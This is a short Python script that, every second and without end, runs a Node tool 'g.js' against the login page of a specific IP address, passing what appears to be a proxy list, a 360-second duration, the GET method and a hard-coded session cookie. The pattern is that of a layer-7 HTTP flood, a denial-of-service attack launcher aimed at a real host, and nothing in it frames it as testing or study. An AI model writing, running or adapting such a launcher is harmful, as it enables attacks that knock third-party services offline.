import schedule
import time
import os
import sys

os.system('node g.js https://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:fnt6bi6h9qubbt1toh9loc2j34')

def job():
    os.system('node g.js https://184.168.114.10/LOGIN all.txt 360 GET PHPSESSID:fnt6bi6h9qubbt1toh9loc2j34')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
